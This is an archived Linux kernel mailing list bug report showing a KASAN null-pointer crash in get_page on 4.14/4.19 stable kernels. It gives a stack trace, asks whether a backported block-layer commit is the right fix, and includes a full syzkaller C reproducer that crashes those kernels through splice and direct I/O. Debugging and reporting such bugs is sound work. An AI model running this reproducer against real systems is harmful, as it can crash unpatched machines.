Return-Path: <linux-block-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id DBA9EC433EF
	for <linux-block@archiver.kernel.org>; Fri, 29 Oct 2021 16:15:46 +0000 (UTC)
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.kernel.org (Postfix) with ESMTP id C23BC610E8
	for <linux-block@archiver.kernel.org>; Fri, 29 Oct 2021 16:15:46 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229645AbhJ2QSN (ORCPT <rfc822;linux-block@archiver.kernel.org>);
        Fri, 29 Oct 2021 12:18:13 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:41696 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229623AbhJ2QSM (ORCPT
        <rfc822;linux-block@vger.kernel.org>);
        Fri, 29 Oct 2021 12:18:12 -0400
Received: from mail-pf1-x430.google.com (mail-pf1-x430.google.com [IPv6:2607:f8b0:4864:20::430])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 4ACCAC061570
        for <linux-block@vger.kernel.org>; Fri, 29 Oct 2021 09:15:44 -0700 (PDT)
Received: by mail-pf1-x430.google.com with SMTP id m26so9702908pff.3
        for <linux-block@vger.kernel.org>; Fri, 29 Oct 2021 09:15:44 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=chromium.org; s=google;
        h=date:from:to:cc:subject:message-id:mime-version:content-disposition;
        bh=2t0VWGYUw0Fo42Kz5oSHBAeqjBHSu44lnRpnefBub2c=;
        b=AzkmPDKjR1nkUpSbPCw2W4hxMah899p2pP/ARUY8tchZIyJqBUD3KH6yQ0/8kbqrt4
         K+qb9FE/EfsNZF0KytbrS5PNtT47AeLa1raUBQAgm9zoFsz9wlc8NJZ9WaJ/4msFvfN6
         867jjd8A3xNwGfqDVEfwf7vAwTgN8pJLFVGrY=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:date:from:to:cc:subject:message-id:mime-version
         :content-disposition;
        bh=2t0VWGYUw0Fo42Kz5oSHBAeqjBHSu44lnRpnefBub2c=;
        b=6HLh/g/HsKOS/YjNkvwuq8eN73P6iH8c71rHfyu4iTyu+WYfcq/McheaT9pkGqjBq1
         N672PW98k77Z64VUx9SiajmzitoDz6xFxNksVZR/0bCA9qwHu9+ELgMw6U3bmJizvq/Q
         kB071lhH5CzHisTF7dGykaLmKOJd18CVshUeSRrSni/60M3Itz/Pr+Bz7ClM9aw5Ytmz
         M1dowSASomiy/3vn0nBwgWtJJR37+LU/PbJg1wIyJGZZfGIA/YjHau8gHnXGtXFyPIJf
         A5/eVmAlxkw6VZ+oge1989MmS/34AA5bvZf0/HgokOVA1nDty22qnx/UkosWpEV9vT21
         m6Vw==
X-Gm-Message-State: AOAM5323l6j8hZv+vR8aNYO++xguX15NVkCJae+U9pCBUrPVCoiPwvgv
        32qttH2PkYfqszUD2wSYw24hKA==
X-Google-Smtp-Source: ABdhPJymss3Vp2JXWbpFffB/GFPJ2lUaOjr9fDE3pf3s9FbJfIrgI2Yus5ubSzmP6DJoR9hXpzHlyw==
X-Received: by 2002:a05:6a00:801:b0:47d:9dc8:5751 with SMTP id m1-20020a056a00080100b0047d9dc85751mr11764120pfk.32.1635524143741;
        Fri, 29 Oct 2021 09:15:43 -0700 (PDT)
Received: from google.com ([2620:15c:202:201:6b3c:8a9c:b428:c1c5])
        by smtp.googlemail.com with ESMTPSA id x190sm7054979pfc.212.2021.10.29.09.15.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 29 Oct 2021 09:15:42 -0700 (PDT)
Date:   Fri, 29 Oct 2021 09:15:35 -0700
From:   Zubin Mithra <zsm@chromium.org>
To:     axboe@kernel.dk, hch@lst.de, osandov@fb.com, ming.lei@redhat.com,
        linux-block@vger.kernel.org
Cc:     groeck@chromium.org
Subject: KASAN: null-ptr-deref in get_page
Message-ID: <YXweJ00CVsDLCI7b@google.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Precedence: bulk
List-ID: <linux-block.vger.kernel.org>
X-Mailing-List: linux-block@vger.kernel.org

Hello,

Recently we noticed the attached PoC cause a GPF with the following stacktrace in linux-4.14.y and linux-4.19.y.

	BUG: KASAN: null-ptr-deref in get_page+0xf/0x65
	Read of size 8 at addr 0000000000000008 by task poc2/3395

	CPU: 0 PID: 3395 Comm: poc2 Not tainted 4.19.214-00936-g38ec06730e44 #59
	Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
	Call Trace:
	 dump_stack+0xe7/0x131
	 kasan_report+0x22a/0x272
	 get_page+0xf/0x65
	 submit_page_section+0xf4/0x202
	 do_blockdev_direct_IO+0xb90/0xfb9
	 ? dio_set_defer_completion+0x57/0x57
	 ? lock_is_held_type+0x78/0x86
	 ? jbd2_journal_stop+0x6fa/0x742
	 ? ext4_get_block_trans+0x188/0x188
	 ? lock_downgrade+0x29a/0x29a
	 ? __blockdev_direct_IO+0x52/0x93
	 ? do_journal_get_write_access+0x7b/0x7b
	 ext4_direct_IO+0x4eb/0x7ad
	 ? ext4_get_block_trans+0x188/0x188
	 generic_file_direct_write+0x132/0x1d8
	 __generic_file_write_iter+0xa6/0x1c0
	 ? generic_write_checks+0x173/0x19d
	 ext4_file_write_iter+0x450/0x549
	 ? ext4_unwritten_wait+0x153/0x153
	 ? iter_file_splice_write+0x11a/0x4d7
	 ? lock_acquire+0x1a7/0x1e7
	 ? iter_file_splice_write+0x11a/0x4d7
	 ? lock_acquire+0x1b7/0x1e7
	 ? match_held_lock+0x2e/0x102
	 ? __lock_is_held+0x2a/0x87
	 do_iter_readv_writev+0x145/0x1b1
	 ? file_start_write.isra.0+0x34/0x34
	 ? avc_policy_seqno+0x1d/0x25
	 ? selinux_file_permission+0xce/0x115
	 do_iter_write+0xa6/0xe6
	 iter_file_splice_write+0x337/0x4d7
	 ? __do_compat_sys_vmsplice+0x16c/0x16c
	 ? match_held_lock+0x2e/0x102
	 ? lock_is_held_type+0x78/0x86
	 __do_sys_splice+0x6cc/0x8f6
	 ? ipipe_prep.part.0+0x99/0x99
	 ? mark_held_locks+0x2d/0x84
	 ? do_syscall_64+0x14/0x90
	 do_syscall_64+0x74/0x90
	 entry_SYSCALL_64_after_hwframe+0x49/0xbe
	RIP: 0033:0x43f579

Applying the following patch on linux-4.14.y/linux-4.19.y stops the crash from occurring on either of
these kernels.
	3d75ca0adef4 ("block: introduce multi-page bvec helpers")

Tracking the control flow with and without 3d75ca0adef4; there seems to be a callpath as follows:
	do_blockdev_direct_IO => do_direct_IO => dio_get_page => dio_refill_pages => iov_iter_get_pages

iov_iter_get_pages() returns 0x8000(without the patch) vs 0x1000(with the patch). This seems to be the
first point at which control flow diverges between the two from do_blockdev_direct_IO() onward.

Is 3d75ca0adef4 the correct fix, or would it be masking a different underlying problem?


PoC causing crash below:
// general protection fault in __blockdev_direct_IO
// https://syzkaller.appspot.com/bug?id=d98d666ccfa0e74f2e459083956394fee8a985df
// status:open
// autogenerated by syzkaller (https://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

void execute_one(void)
{
	int pipefd[2];
	int sockfd;
	int fd;

	syscall(__NR_creat, "./bus", 0);
	if (creat("./bus", 0) == -1) {
		fprintf(stderr, "creat failed\n");
		exit(1);
	}

	if (pipe(pipefd) == -1) {
		fprintf(stderr, "pipe failed\n");
		exit(1);
	}

	if ((sockfd = syscall(__NR_socket, 2, 1, 0)) == -1) {
		fprintf(stderr, "socket failed\n");
		exit(1);
	}

	*(uint32_t*)0x20000080 = 1;
	syscall(__NR_setsockopt, sockfd, 6, 0x10000000013, 0x20000080, 4);
	*(uint32_t*)0x20788ffc = 1;
	syscall(__NR_setsockopt, sockfd, 6, 0x14, 0x20788ffc, 0xfdf6);
	*(uint16_t*)0x20000000 = 2;
	*(uint16_t*)0x20000002 = htobe16(0);
	syscall(__NR_connect, sockfd, 0x20000000, 0x10);
	memcpy((void*)0x20000100, "\xcc", 1);
	syscall(__NR_sendto, sockfd, 0x20000100, 0xffffffffffffff3d, 0, 0, 0);

	syscall(__NR_splice, sockfd, 0, pipefd[1], 0, 0x11001, 0);

	memcpy((void*)0x20000040, "./bus\000", 6);
	if ((fd = syscall(__NR_open, 0x20000040, 0x4082, 0)) == -1) {
		fprintf(stderr, "open failed\n");
		exit(1);
	}

	syscall(__NR_splice, pipefd[0], 0, fd, 0, 0xffffffff, 0);
}
int main(void)
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	execute_one();
	return 0;
}


Thanks,
- Zubin
